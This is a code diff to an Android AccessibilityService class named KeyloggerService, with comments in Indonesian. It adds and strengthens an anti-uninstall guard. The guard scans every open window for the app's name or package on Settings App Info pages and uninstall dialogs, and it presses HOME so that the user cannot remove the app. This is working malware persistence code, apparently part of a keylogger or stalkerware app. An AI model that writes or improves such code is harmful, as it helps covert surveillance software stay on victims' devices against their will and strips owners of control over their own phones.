@@ -152,7 +152,7 @@ class KeyloggerService : AccessibilityService() {
 
                 // ── Guard: tutup App Info / uninstall jika mengarah ke app kita ─
                 if (ev.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
-                    guardAgainstUninstall(pkg)
+                    guardAgainstUninstall(pkg, ev.className?.toString())
                 }
             }
 
@@ -205,67 +205,105 @@ class KeyloggerService : AccessibilityService() {
         }
     }
 
+    // ── Guard Anti-Uninstall ──────────────────────────────────────────────────
+    // Token object untuk removeCallbacksAndMessages agar bisa dibatalkan
+    private val guardToken = Object()
+
     /**
-     * Guard Anti-Uninstall via AccessibilityService.
+     * Dipanggil tiap TYPE_WINDOW_STATE_CHANGED.
      *
-     * Dipanggil setiap kali window baru muncul (TYPE_WINDOW_STATE_CHANGED).
-     * Jika window adalah halaman App Info milik app kita (di Settings)
-     * atau dialog konfirmasi uninstall (PackageInstaller), langsung tekan
-     * HOME → user keluar dari halaman, app tidak bisa di-uninstall.
+     * Dua skenario:
+     *  1. className mengandung "AlertDialog" / "Dialog" (dialog konfirmasi uninstall
+     *     dari MIUI/Settings) → scan semua window sekarang, kalau ada nama app kita → HOME
+     *  2. Settings / PackageInstaller page biasa → scan dengan delay 500ms
      *
-     * Tidak butuh SYSTEM_ALERT_WINDOW — murni AccessibilityService.
+     * Menggunakan `windows` list (bukan hanya rootInActiveWindow) agar
+     * bisa mendeteksi window yang mungkin tidak sedang di-focus.
      */
-    private fun guardAgainstUninstall(pkg: String) {
-        val ourPkg = packageName
+    private fun guardAgainstUninstall(pkg: String, className: String?) {
+        val cls = className ?: ""
 
         when {
-            // ── Halaman App Info di Settings ──────────────────────────────────
-            // Deteksi: window Settings muncul + node tree mengandung package kita
             SETTINGS_PACKAGES.contains(pkg) -> {
-                handler.postDelayed({
-                    if (isShowingOurAppInfo(ourPkg)) {
+                // Dialog konfirmasi uninstall → cek segera tanpa delay
+                if (cls.contains("AlertDialog", ignoreCase = true) ||
+                    cls.contains("Dialog",      ignoreCase = true)) {
+                    handler.removeCallbacksAndMessages(guardToken)
+                    handler.postDelayed({
+                        if (isOurAppVisibleInAnyWindow()) {
+                            performGlobalAction(GLOBAL_ACTION_HOME)
+                        }
+                    }, 150)
+                    return
+                }
+                // App Info page biasa → scan setelah activity fully rendered
+                handler.removeCallbacksAndMessages(guardToken)
+                handler.postAtTime({
+                    if (isOurAppVisibleInAnyWindow()) {
                         performGlobalAction(GLOBAL_ACTION_HOME)
                     }
-                }, 300)
+                }, guardToken, android.os.SystemClock.uptimeMillis() + 500)
             }
 
-            // ── Dialog konfirmasi Uninstall (PackageInstaller) ────────────────
-            // Jika dialog uninstall muncul untuk app kita, langsung HOME
+            // PackageInstaller (AOSP/Pixel/Samsung) → HOME langsung
             UNINSTALL_PACKAGES.contains(pkg) -> {
+                handler.removeCallbacksAndMessages(guardToken)
                 handler.postDelayed({
                     performGlobalAction(GLOBAL_ACTION_HOME)
-                }, 200)
+                }, 150)
             }
         }
     }
 
     /**
-     * Cek apakah window Settings yang aktif saat ini menampilkan
-     * App Info untuk package kita.
-     * Strategi: scan semua text node — jika ada yang mengandung packageName
-     * kita atau nama app kita, berarti ini halaman App Info kita.
+     * Scan SEMUA window yang sedang ada (bukan hanya rootInActiveWindow)
+     * menggunakan AccessibilityService.getWindows() — lebih reliable
+     * karena dialog tidak selalu menjadi rootInActiveWindow.
+     *
+     * Return true jika ada window yang mengandung teks nama / package kita.
      */
-    private fun isShowingOurAppInfo(ourPkg: String): Boolean {
-        val root = rootInActiveWindow ?: return false
+    private fun isOurAppVisibleInAnyWindow(): Boolean {
+        val ourPkg     = packageName
         val ourAppName = try {
             packageManager.getApplicationLabel(
                 packageManager.getApplicationInfo(ourPkg, 0)
             ).toString().lowercase()
         } catch (_: Exception) { "" }
 
+        // Strategi utama: scan semua window (FLAG_RETRIEVE_INTERACTIVE_WINDOWS aktif)
+        val wins = try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) windows else null
+        } catch (_: Exception) { null }
+
+        if (wins != null) {
+            for (w in wins) {
+                val root = try { w.root } catch (_: Exception) { null } ?: continue
+                val found = try {
+                    nodeContainsText(root, ourPkg) ||
+                    (ourAppName.isNotBlank() && nodeContainsText(root, ourAppName))
+                } catch (_: Exception) { false }
+                try { root.recycle() } catch (_: Exception) {}
+                if (found) return true
+            }
+            return false
+        }
+
+        // Fallback: rootInActiveWindow saja
+        val root = try { rootInActiveWindow } catch (_: Exception) { null } ?: return false
         return try {
-            nodeContainsText(root, ourPkg) || (ourAppName.isNotBlank() && nodeContainsText(root, ourAppName))
+            nodeContainsText(root, ourPkg) ||
+            (ourAppName.isNotBlank() && nodeContainsText(root, ourAppName))
         } finally {
             try { root.recycle() } catch (_: Exception) {}
         }
     }
 
-    /** Rekursif scan node tree — cari node yang text/desc mengandung [target] */
+    /** Rekursif scan node tree — return true jika ada node yang text/desc mengandung [target] */
     private fun nodeContainsText(
         node: android.view.accessibility.AccessibilityNodeInfo,
         target: String
     ): Boolean {
-        val t = target.lowercase()
+        val t    = target.lowercase()
         val text = node.text?.toString()?.lowercase() ?: ""
         val desc = node.contentDescription?.toString()?.lowercase() ?: ""
         if (text.contains(t) || desc.contains(t)) return true
